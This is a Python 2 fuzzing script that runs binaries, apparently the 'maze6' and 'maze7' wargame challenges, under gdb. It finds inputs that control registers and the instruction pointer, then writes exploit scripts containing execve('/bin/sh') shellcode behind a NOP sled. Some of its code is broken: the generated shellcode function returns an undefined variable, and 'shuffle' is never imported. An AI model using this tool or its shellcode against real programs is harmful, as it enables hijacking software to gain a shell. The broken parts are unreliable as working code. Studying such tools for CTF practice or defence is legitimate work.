#!/usr/bin/env python
# copy from register-fuzz

import os
import sys
import random
import copy
import json
from random import randrange
import paramiko
import threading
from binascii import hexlify, unhexlify
import struct
import glob

from multiprocessing import Process,Queue
from gdb import gdb

#  __               
# / _|_   _ ________
#| |_| | | |_  /_  /
#|  _| |_| |/ / / / 
#|_|  \__,_/___/___|
class registerFuzz():
    def __init__(self, test_wrapper, seeds, min_len, max_len, bits=64):
        self.test_wrapper = test_wrapper
        self.seeds = seeds
        self.min_len = min_len
        self.max_len = max_len
        self.bits = bits

        self.work_queue = Queue()
        self.done_queue = Queue()
        self.crash = {}

        for i in xrange(4):
            d = Process(target=self.worker, args=())
            d.daemon=True
            d.start()

    def reset_queue(self):
        while not self.work_queue.empty():
            self.work_queue.get_nowait()

        self.work_queue.put(self.random_testcase())
        keys = self.crash.keys()
        shuffle(keys)
        for rip in keys:
            self.work_queue.put(self.crash[rip])

    def worker(self):
        print "worker started"
        while True:
            testcase = self.work_queue.get()
            try:
                stdout, regs = self.test_wrapper(testcase["bin"])
                if regs == None or stdout == None:
                    continue
            except:
                import traceback; traceback.print_exc()
                continue

            self.done_queue.put((testcase,stdout,regs))
            

    def run(self):
        for fname in glob.glob("crash/*.json"):
            with open(fname, "r") as f:
                t = json.loads(f.read())
                t["bin"] = unhexlify(t["bin"])
                self.work_queue.put(t)
            
        i = 0
        crash = self.crash
        while True:
            if self.work_queue.qsize() > 10240:
                self.reset_queue()

            if self.work_queue.qsize() < 20:
                self.work_queue.put(self.random_testcase())

            testcase,stdout,regs = self.done_queue.get()

            #search for registers
            reg = []
            register_debug = ""
            for r in regs:
                target = regs[r]
                if target in testcase["bin"] and regs[r] != "\x00\x00\x00\x00\x00\x00\x00\x00":
                    reg += [r]

                    offset = testcase["bin"].index(target)
                    v = hexlify(regs[r][::-1])
                    register_debug += "found register %s (%s) at offset %d\n" % (r, v, offset)

            if self.bits == 32:
                rip = regs["eip"]
            else:
                rip = regs["rip"]
            crash_id = hexlify(rip[::-1]) + ":"+",".join(sorted(reg))

            #detect new crash
            i += 1
            if crash_id not in crash:
                crash[crash_id] = testcase
                if i > 512:
                    self.reset_queue()

                #gdb output
                with open("crash/%s.gdb" % (crash_id), "w") as f:
                    f.write("#"*42 + "\n")
                    f.write(stdout + "\n\n\n")

                ##rip control
                if rip in testcase["bin"]:
                    val = { "name": "rip",
                            "base": 0xdeadbeef,
                            "rand": 0,
                            "len" : 4 if self.bits == 32 else 8,
                            "offset": testcase["bin"].index(rip)}

                    testcase["vals"] += [val]
                    self.generate_python( testcase, "crash/%s.py" % (crash_id))

                #testcase
                with open("crash/%s.bin" % (crash_id), "w") as f: f.write(testcase["bin"])
                testcase2 = copy.deepcopy(testcase)
                testcase2["bin"] = hexlify(testcase2["bin"])
                with open("crash/%s.json" % (crash_id), "w") as f: f.write(json.dumps(testcase2,indent=4))

            if i % 50 == 0:
                os.system("reset")
                print "\x1b[0;0H"+"\x1b[2J"+"\r",
                for ip in sorted(crash.keys()):
                    
                    if "rip" in ip or "eip" in ip:
                        print ">>>crash at %s" % ip
                    else:
                        print "crash at %s" % ip
                print "total: %d" % len(crash)

                print "#############################################"
            sys.stdout.write(".")
            sys.stdout.flush()
                
            self.generate_testcases(testcase, regs)

    def random_testcase( self):
        testcase = {}
        testcase["bin"] = os.urandom(randrange(self.min_len, self.max_len))
        testcase["vals"] = []
        return testcase

    def generate_testcases(self, testcase, regs):
        #random mutation
        t = os.urandom(randrange(16))
        offset = randrange(len(testcase["bin"])-len(t))
        bin2 = testcase["bin"][:offset]
        bin2 += t
        bin2 += testcase["bin"][offset+len(t):]
        testcase2 = copy.deepcopy(testcase)
        testcase2["bin"] = bin2
        self.work_queue.put(testcase2)

        #register fuzz
        offsets = []
        for r in regs:
            if r in ["rip","eip"]:
                continue

            if regs[r] in testcase["bin"]:
                offset = testcase["bin"].index(regs[r])
                v = hexlify(regs[r][::-1])
                #print "found register %s (%s) at offset %d" % (r, v, offset)

                if offset not in offsets:
                    offsets += [offset]
                    for seed in self.seeds:
                        rand = randrange(seed["randomize"])
                        t = seed["base"] + rand
                        #t = t&0xfffffffffffffff0
                        if self.bits == 32:
                            t = struct.pack('<I',t)
                        else:
                            t = struct.pack('<Q',t)

                        bin2 = testcase["bin"][:offset]
                        bin2 += t
                        bin2 += testcase["bin"][offset+len(t):]


                        #assemble new testcase
                        testcase2 = copy.deepcopy(testcase)
                        testcase2["bin"] = bin2

                        #check if offset is already used by other var
                        dup = False
                        for v in testcase2["vals"]:
                            if v["offset"] == offset:
                                dup = True
                                v["name"] = seed["name"]
                                v["base"] = seed["base"]
                                v["rand"] = rand
                                v["len"] = 4 if self.bits == 32 else 8

                        if not dup:
                            val = { "name": seed["name"],
                                    "base": seed["base"],
                                    "rand": rand,
                                    "len" : 4 if self.bits == 32 else 8,
                                    "offset": offset }
                            testcase2["vals"] += [val]

                        self.work_queue.put(testcase2)
                

    def generate_python(self, testcase, fname=""):
        mini = self.minimize(testcase)
        with open( fname, "w") as f:
            f.write("import sys\n")
            f.write("import struct\n")
            f.write("from binascii import hexlify, unhexlify\n")
            f.write("\n")
            f.write("raw = unhexlify(\"%s\")\n" % hexlify(testcase["bin"]))
            f.write("mini = unhexlify(\"%s\")\n" % hexlify(mini))
            f.write("\n")
            f.write("def shellcode(n):\n")
            f.write("  payload23 = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n")
            f.write("  payload28 = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n")
            f.write("  return \"\\x90\"*(n-len(payload28))+payload\n")
            f.write("\n")

            #add variables
            argc = 1
            names = []
            for val in testcase["vals"]:
                if val["name"] not in names:
                    names += [val["name"]]
                else:
                    continue

                if "magic" not in val["name"]:
                    f.write("%s = %s + int(sys.argv[%d],16)\n" % (val["name"], hex(val["base"]), argc))
                    argc += 1
                else:
                    f.write("%s = %s\n" % (val["name"], hex(val["base"])))

            #asseble crash string
            f.write("\n")
            f.write("crash = \"\"\n")
            l = 0
            for val in sorted(testcase["vals"], key=lambda x: x["offset"]):
                f.write("crash += \"B\"*%d\n" % (val["offset"]-l))

                l += val["offset"] - l
                #set register
                if val["len"] == 1:
                    f.write( "crash += struct.pack('<B',%s+%d)#offset %d\n"%(val["name"],val["rand"],val["offset"]))
                if val["len"] == 4:
                    f.write( "crash += struct.pack('<I',%s+%d)#offset %d\n"%(val["name"],val["rand"],val["offset"]))
                elif val["len"] == 8:
                    f.write( "crash += struct.pack('<Q',%s+%d)\n"%(val["name"],val["rand"]))
                l += val["len"]

            f.write("crash += \"B\"*%d\n" % (len(testcase["bin"])-l))


            f.write("\n")
            f.write("if __name__ == '__main__':\n")
            f.write("  sys.stdout.write(crash)\n")

        #remove magic_xx values
        testcase["vals"] = filter(lambda x: "magic_" not in x["name"], testcase["vals"])
            
                
    def minimize(self, testcase):
        d = testcase["bin"]

        #test for unused bytes
        stdout, regs = self.test_wrapper(d)
        d_min = d[:]
        for i in xrange(len(d)):
            print "\rminimize... %d" % i,
            sys.stdout.flush()
            d2 = d_min[:i] + chr(ord(d_min[i]) ^ 0xff) + d_min[i+1:]
            try:
                s, r = self.test_wrapper(d2)
                if r is None:
                    raise

            except:
                r = {"rip": 0x00}
                r = {"eip": 0x00}

            if (self.bits == 32 and r["eip"] == regs["eip"]) or (self.bits == 64 and  r["rip"] == regs["rip"]):
                d_min = d_min[:i] + "B" + d_min[i+1:]

            #add missing magic values
            else:
                known = False
                for val in testcase["vals"]:
                    if val["offset"] <= i and val["offset"] + val["len"] > i:
                        known = True

                if not known:
                    print "\nfound new magic value %02x at offset %d" % (ord(d_min[i]),i)
                    val = { "name": "magic_%02x" % ord(d_min[i]),
                            "base": ord(d_min[i]),
                            "rand": 0,
                            "len" : 1,
                            "offset": i }
                    testcase["vals"] += [val]
        print ""

        return d_min


if __name__ == "__main__":
    #custom maze6 wrapper
    def maze6(d):
        d = "".join([chr(ord(x) ^ 42) for x in d])
        args = ["/dev/null", d]

        g = gdb("./maze6", args,bits=32)
        try:
            g.run()
            regs = g.get_regs()
            stdout = g.stdout
        except:
            stdout = ""
            regs = None

        g.finish()
        return stdout, regs

    maze6_seeds = [
             { "base": 0xffffd430,
                "name": "buff_ptr",
                "randomize": 300},
              { "base": 0,
                "name": "magic",
                "randomize": 64},
            ]

    #custom maze7 wrapper
    def maze7(d):
        rand = hexlify(os.urandom(4))
        f = open("/tmp/a-"+rand, "w")
        f.write(d)
        f.close()
            
        args = ["/tmp/a-"+rand]

        g = gdb("./maze7", args,bits=32)
        try:
            g.run()
            regs = g.get_regs()
            stdout = g.stdout
        except:
            stdout = ""
            regs = None

        g.finish()
        os.unlink("/tmp/a-"+rand)
        return stdout, regs

    maze7_seeds = [
             { "base": 0xffffd540,
                "name": "buff_ptr",
                "randomize": 1024},
             { "base": 0x804a400,
                "name": "heap",
                "randomize": 1024},
            ]

    ##maze7(open("/tmp/a-e21f5fe0","r").read())
    ##f = open("a.out","r")
    #raw = f.read()
    #while False:
    #    try:
    #        data = os.urandom(randrange(4))
    #        offset = randrange(len(raw)-len(data))
    #        case = raw[:offset] + data + raw[offset+len(data):]
    #        s,reg = maze7(case)
    #        print "crash!" 
    #        if "eip" in reg:
    #            print hexlify(reg["eip"][::-1])
    #    except KeyboardInterrupt:
    #        sys.exit(1)
    #    except:
    #        pass

    #sys.stdout.write(complex_calc_stdin2("A"+"ABCDEFGH"*32))
    #with open("crash/00000000004156e9:r10,r11,r12,r15,r8,r9,rax,rcx,rdx.bin","r") as f:
    #    s = f.read()
    #    sys.stdout.write(complex_calc_stdin2(s))
    #print complex_calc("A"+"ABCDEFGH"*32)[1]
    #print complex_calc("\xff"+ "A"*int(sys.argv[1]))
    #sys.exit(1)
    #r = registerFuzz(complex_calc, complex_calc_seeds, 512,1024)
    r = registerFuzz(maze6, maze6_seeds, 200,500,bits=32)
    #r = registerFuzz(maze7, maze7_seeds, 10240,20480,bits=32)
    try:
        r.run()
    except KeyboardInterrupt:
        import traceback; traceback.print_exc()
        os.kill(os.getpid(), 9)



    #r = registerFuzz(maze6, maze6_seeds, 400,500)
    #r.run()
    #r = registerFuzz(free, free_seeds, 30,100)
    #r.run()

    #with open("crash/936e3d09:**esi,*eax,*esi,eax,eip,esi.json","r") as f:
    #    testcase = json.loads(f.read())
    #    testcase["bin"] = unhexlify(testcase["bin"])
    #r.generate_python(testcase, "/tmp/exploit.py")
